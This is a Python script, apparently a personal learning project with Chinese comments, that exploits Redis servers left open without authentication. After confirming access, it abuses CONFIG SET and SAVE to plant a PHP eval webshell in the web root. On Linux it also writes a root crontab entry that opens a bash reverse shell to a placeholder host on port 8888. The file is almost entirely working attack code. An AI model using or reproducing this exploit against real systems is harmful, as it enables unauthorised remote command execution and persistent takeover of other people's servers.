# -*- coding: utf-8 -*-
# @Time    : 14 2月 2025 10:11 下午
# @Author  : codervibe
# @File    : redisScan升级版.py
# @Project : pythonBasics
# 在check_redis_connect函数中添加操作系统判断逻辑

import socket
import redis

def check_redis_connect(ip):
    """
    检查指定 IP 的 Redis 是否存在未授权访问问题。

    :param ip: 需要检查的 IP 地址
    """
    try:
        r = redis.StrictRedis(host=ip, port=6379, socket_timeout=0.3)
        info = r.info()

        # 新增操作系统判断
        os_type = info.get('os', 'linux').lower()  # 从Redis信息中获取操作系统类型

        if info:
            print(f"[+] {ip}  存在未授权访问（运行系统：{os_type.upper()}）")  # 增加系统类型提示
            print(f"[+] {r.client_list()}")

            # 根据操作系统调用不同攻击模块
            if os_type == 'linux':
                exp_crontab(r)
                exp_webShell(r, os_type)
            else:
                exp_webShell(r, os_type)

    except (redis.ConnectionError, redis.ResponseError) as e:
        print(f"[-] 连接或操作失败: {str(e)}")

# 修改漏洞利用函数增加系统适配
def exp_webShell(redis_client, os_type='linux'):
    """
    根据操作系统写入webshell

    :param redis_client: Redis客户端对象
    :param os_type: 操作系统类型（windows/linux）
    """
    # 根据操作系统设置不同web根目录
    web_roots = {
        'linux': '/var/www/html',
        'windows': 'D:/phpstudy_pro/WWW'
    }

    # 如果无法识别操作系统则尝试通用路径
    target_dir = web_roots.get(os_type, '/tmp')

    try:
        redis_client.config_set('dir', target_dir)
        redis_client.config_set('dbfilename', 'shell.php')
        redis_client.set('x', "<?php @eval($_POST['hihack']);?>")
        redis_client.save()
        print(f"[+] Webshell 写入成功至 {target_dir}")
    except redis.ResponseError:
        print(f"[-] 路径 {target_dir} 配置失败，可能权限不足或路径不存在")

def exp_crontab(redis_client):
    """
    Linux专用定时任务写入（Windows系统自动跳过）
    """
    if not check_linux_ssh(redis_client):  # 新增前置检查
        print("[-] 非Linux系统或SSH服务未开放，跳过定时任务")
        return

    try:
        redis_client.config_set('dir', '/var/spool/cron')
        redis_client.config_set('dbfilename', 'root')
        redis_client.set('x', '\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/your_ip/8888 0>&1\n\n')
        redis_client.save()
        print(f"[+] Linux定时任务已创建")
    except redis.ResponseError as e:
        print(f"定时任务创建失败: {str(e)}")

# 新增辅助判断函数
def check_linux_ssh(redis_client, port=22):
    """
    检查目标服务器是否开放SSH端口（辅助判断是否为真实Linux服务器）
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((redis_client.connection_pool.connection_kwargs['host'], port))
        s.close()
        return True
    except (socket.error, socket.timeout) as e:
        print(f"[-] SSH端口检查失败: {str(e)}")
        return False

